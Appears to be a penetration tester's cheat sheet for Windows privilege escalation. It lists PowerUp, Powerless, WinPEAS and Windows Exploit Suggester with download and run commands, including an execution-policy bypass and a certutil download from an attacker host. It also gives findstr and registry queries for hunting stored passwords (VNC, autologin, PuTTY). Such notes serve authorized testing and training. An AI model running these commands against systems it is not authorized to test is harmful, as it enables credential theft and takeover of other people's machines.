
- PowerUP
  - Powershell required
  - Download `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1`
  - Run on Windows `powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"`
  
- Powerless
  - For legacy systems
  - Powershell not available
  - Download `wget https://raw.githubusercontent.com/gladiatx0r/Powerless/blob/master/Powerless.bat`
  - Drop `certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat`
  - Run on Windows `Powerless.bat`
  
 - WinPEAS
   - Release https://github.com/carlospolop/PEASS-ng/releases/tag/20220807
    
 - Windows Exploit Suggester
   - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
   - Download `wget https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py`
   - Run `systeminfo` on the target Windows machine and save the output in a txt file.
   - `python3 windows-exploit-suggester.py --update`
   - `python3 windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt`
   - Grep 'Elevation' `./windows-exploit-suggester.py –database 2015-09-22-mssb.xlsx –systeminfo systeminfo_1.txt | grep 'Elevation'`

- Search for passwords 

  - In Files

    ```
      findstr /si password *.txt
      findstr /si password *.xml
      findstr /si password *.ini

      #Find all those strings in config files.
      dir /s *pass* == *cred* == *vnc* == *.config*

      # Find all passwords in all files.
      findstr /spin "password" *.*
      findstr /spin "password" *.*
    ```
    
  - In Registry
  
    ```
    # VNC
    reg query "HKCU\Software\ORL\WinVNC3\Password"

    # Windows autologin
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

    # SNMP Paramters
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

    # Putty
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

    # Search for password in registry
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

    ```
    
- Enumerate Local Services
  - `netstat -ano`
